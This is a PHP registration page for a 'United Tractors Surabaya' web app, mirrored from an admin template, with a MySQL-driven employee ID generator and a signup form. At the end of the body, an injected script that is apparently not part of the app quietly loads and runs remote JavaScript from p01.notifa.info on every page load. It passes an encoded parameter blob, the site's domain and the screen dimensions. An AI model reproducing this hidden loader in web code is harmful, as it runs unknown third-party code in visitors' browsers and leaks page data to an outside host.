<?php
session_start();
include("koneksi.php");
?>

<!DOCTYPE html>
<html lang="en">
<!-- Mirrored from html.codedthemes.com/guru-able/default/auth-normal-sign-in.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 22 Jan 2019 00:56:05 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
    <title>UNITED TRACTORS SURABAYA </title>
    <!-- HTML5 Shim and Respond.js IE10 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 10]>
      <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
      <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
      <![endif]-->
    <!-- Meta -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0, minimal-ui">
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="description" content="#">
    <meta name="keywords" content="Admin , Responsive, Landing, Bootstrap, App, Template, Mobile, iOS, Android, apple, creative app">
    <meta name="author" content="#">
    <!-- Favicon icon -->

    <link rel="icon" href="http://html.codedthemes.com/guru-able/files/assets/images/favicon.ico" type="image/x-icon">
    <!-- Google font--><link href="https://fonts.googleapis.com/css?family=Open+Sans:400,600,800" rel="stylesheet">
    <!-- Required Fremwork -->
    <link rel="stylesheet" type="text/css" href="../files/bower_components/bootstrap/css/bootstrap.min.css">
    <!-- themify-icons line icon -->
    <link rel="stylesheet" type="text/css" href="../files/assets/icon/themify-icons/themify-icons.css">
    <!-- ico font -->
    <link rel="stylesheet" type="text/css" href="../files/assets/icon/icofont/css/icofont.css">
    <!-- Style.css -->
    <link rel="stylesheet" type="text/css" href="../files/assets/css/style.css">


</head>

<body class="fix-menu">
    <!-- Pre-loader start -->
    <div class="theme-loader">
    <div class="ball-scale">
        <div class='contain'>
            <div class="ring"><div class="frame"></div></div>
            <div class="ring"><div class="frame"></div></div>
            <div class="ring"><div class="frame"></div></div>
            <div class="ring"><div class="frame"></div></div>
            <div class="ring"><div class="frame"></div></div>
            <div class="ring"><div class="frame"></div></div>
            <div class="ring"><div class="frame"></div></div>
            <div class="ring"><div class="frame"></div></div>
            <div class="ring"><div class="frame"></div></div>
            <div class="ring"><div class="frame"></div></div>
        </div>
    </div>
</div>
    <!-- Pre-loader end -->

<!--    <section class="login p-fixed d-flex text-center bg-primary common-img-bg">-->
        <section class="login p-fixed d-flex text-center bg-primary">
        <!-- Container-fluid starts -->
        <div class="container">
        
            <div class="row">
            <?php
            $sql_id = "select max(id_user) as id_user from karyawan WHERE id_user like '%KR%'";
            $hasil_id = mysqli_query($connect, $sql_id);
            if (mysqli_num_rows($hasil_id) > 0) {
                $row = mysqli_fetch_array($hasil_id);
                $idmax = $row['id_user'];
                $id_urut = (int)substr($idmax, 2, 4);
                $id_urut++;
                                    // sprintf = menambahkan (+)
                $id_user = "KR" . sprintf("%04s", $id_urut);
            } else {
                $id_user = "KR0001";
            }
            ?>
                <div class="col-sm-12">
                    <!-- Authentication card start -->
                    <div class="login-card card-block auth-body mr-auto ml-auto">
                        <form class="md-float-material"  method="post" action="resgis_simpan.php" enctype="multipart/form-data">
                            <div class="text-center">
<!--                                <img src="../files/assets/images/auth/logo-dark.png" alt="logo.png">-->
                            </div>
                            
                            <div class="auth-box">
                                <div class="row m-b-20">
                                    <div class="col-md-12">
                                        <h3 class="text-left txt-primary">Use Resgistration </h3>
                                    </div>
                                </div>
                                <hr/>
                                <div class="input-group">
                                    <input type="text" id="id_user" class="form-control form-control-center" name="id_user" placeholder="id_user" value="<?= $id_user ?>" readonly>
                                    <span class="md-line"></span>
                                </div>
                                <div class="input-group">
                                    <input type="email" id="email" class="form-control" name="email" placeholder="Masukkan Email" required>
                                    <span class="md-line"></span>
                                </div>
                                <div class="input-group">
                                    <input type="text" id="nama_user" class="form-control" name="nama_user" placeholder="Masukkan Nama Lengkap" required>
                                    <span class="md-line"></span>
                                </div>
                                
                                <div class="input-group">
                                    <input type="text" id="username" class="form-control" name="username" placeholder="Masukkan Username" required>
                                    <span class="md-line"></span>
                                </div>
                                <div class="input-group">
                                    <input type="password" id="password" class="form-control" name="password" placeholder="Masukkan Password" required>
                                    <span class="md-line"></span>
                                </div>
                                <div class="form-group">
                                    <select class="form-control" id="bagian" name="bagian" value="<?php echo $data['keterangan1']; ?>" required>
                                        <option disabled selected hidden>Pilih Bagian / Dept</option> 
                                        <option>COP</option>
                                        <option>CS</option>
                                    </select>
                                </div>
                                <div class="row m-t-30">
                                    <div class="col-md-12">
                                        <!-- <input name="aksi"  value = "simpan" type="submit" value="Daftar" class="btn btn-primary btn-md btn-block waves-effect text-center m-b-20"> -->
                                    <a href = "registrasi.php" >
                                        <button type="submit" class="btn btn-primary btn-sm" name = "aksi" value = "simpan" >
                                            <i class="fa fa-dot-circle-o"> </i> SIMPAN
                                        </button>
                                    </a>
                                    </div>
                                </div>
                                <hr/>
                                <div class="row">
                                    <div class="col-md-10">
                                        <p class="text-inverse text-left m-b-0">Thank you and enjoy our website .</p>
                                        <p class="text-inverse text-left"><b>Your Authentication Team</b></p>
                                    </div>
                                    <div class="col-md-2">
                                        <img src="../files/assets/images/logout2.png" alt="small-logo.png">
                                    </div>
                                </div>
                            </div>
                        </form>
                        <!-- end of form -->
                      

                      
                    </div>
                    <!-- Authentication card end -->
                </div>
                <!-- end of col-sm-12 -->
            </div>
            <!-- end of row -->
        </div>
        <!-- end of container-fluid -->
    </section>
    <!-- Warning Section Starts -->
    <!-- Older IE warning message -->
    <!--[if lt IE 10]>
<div class="ie-warning">
    <h1>Warning!!</h1>
    <p>You are using an outdated version of Internet Explorer, please upgrade <br/>to any of the following web browsers to access this website.</p>
    <div class="iew-container">
        <ul class="iew-download">
            <li>
                <a href="http://www.google.com/chrome/">
                    <img src="../files/assets/images/browser/chrome.png" alt="Chrome">
                    <div>Chrome</div>
                </a>
            </li>
            <li>
                <a href="https://www.mozilla.org/en-US/firefox/new/">
                    <img src="../files/assets/images/browser/firefox.png" alt="Firefox">
                    <div>Firefox</div>
                </a>
            </li>
            <li>
                <a href="http://www.opera.com">
                    <img src="../files/assets/images/browser/opera.png" alt="Opera">
                    <div>Opera</div>
                </a>
            </li>
            <li>
                <a href="https://www.apple.com/safari/">
                    <img src="../files/assets/images/browser/safari.png" alt="Safari">
                    <div>Safari</div>
                </a>
            </li>
            <li>
                <a href="http://windows.microsoft.com/en-us/internet-explorer/download-ie">
                    <img src="../files/assets/images/browser/ie.png" alt="">
                    <div>IE (9 & above)</div>
                </a>
            </li>
        </ul>
    </div>
    <p>Sorry for the inconvenience!</p>
</div>
<![endif]-->
    <!-- Warning Section Ends -->
    <!-- Required Jquery -->
    <script type="text/javascript" src="../files/bower_components/jquery/js/jquery.min.js"></script>
    <script type="text/javascript" src="../files/bower_components/jquery-ui/js/jquery-ui.min.js"></script>
    <script type="text/javascript" src="../files/bower_components/popper.js/j   s/popper.min.js"></script>
    <script type="text/javascript" src="../files/bower_components/bootstrap/js/bootstrap.min.js"></script>
    <!-- jquery slimscroll js -->
    <script type="text/javascript" src="../files/bower_components/jquery-slimscroll/js/jquery.slimscroll.js"></script>
    <!-- modernizr js -->
    <script type="text/javascript" src="../files/bower_components/modernizr/js/modernizr.js"></script>
    <script type="text/javascript" src="../files/bower_components/modernizr/js/css-scrollbars.js"></script>
    <!-- i18next.min.js -->
    <script type="text/javascript" src="../files/bower_components/i18next/js/i18next.min.js"></script>
    <script type="text/javascript" src="../files/bower_components/i18next-xhr-backend/js/i18nextXHRBackend.min.js"></script>
    <script type="text/javascript" src="../files/bower_components/i18next-browser-languagedetector/js/i18nextBrowserLanguageDetector.min.js"></script>
    <script type="text/javascript" src="../files/bower_components/jquery-i18next/js/jquery-i18next.min.js"></script>
    <script type="text/javascript" src="../files/assets/js/common-pages.js"></script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2uARwFH94Yb9ZSBus1yHsgF9R28w3SoAqVwQyqFLPyaTvp2PkenY1yXSkfwLp6JxtdYirNhrmoEcWmB5HGGo1HPuAkI91aa%2bhuhWjdPwNi%2bpIEhXIeOHxjMOw4gJLQVqOBLlB%2b4r8HmeaKr99YXQw8%2bhRzEZ9jd6YwjNGxerRUdOb8Jc%2f9py2XTW40ILYaOsHc%2bJvFQeIYafaUV%2bNOX4kQ1mUs66%2b1%2fbAdXpI1OhVAGMnIKuT7RI4iZN%2fXDQ87G60xgCJP6pvCXCiIHqLzlf0AQOETgErwt%2fMyA1sDs8XouBL0uOezlWd62nCTXYsvCoM%2bMv6MdqROeDgeEu5Fe9VTu3HnnTMCZYYSNDZACJW7rQHsoA8%2bCjrnvbP%2bG5GIrJGr29iYI%2bYoql2zIhvt3GfoVeo8Lf6HKv2BYmJOCfEk51fpDl%2bEtWe3PEUj6GV2OsbqG5kwFB3IypXSAxVrmhfMtoaBNNSjtOe2k9sKJz72G6%2fNh9k%2bI7tCKgnMH9qCEl1Q%2b4fr2Fwq%2frmCQVJUxQ00VGEh%2bjYHaZBnKdKL8eRRra23CFLYAi%2bAAM1BeprtPvjwYPAdoB7TkN3lUqxPh4Bt5uCEko77rVZx8ZM%2fR4TDEdGS7jjmuJw%2fkw2LcExHBwKEJdEnjMWbDk%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>


<!-- Mirrored from html.codedthemes.com/guru-able/default/auth-normal-sign-in.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 22 Jan 2019 00:56:05 GMT -->
</html>
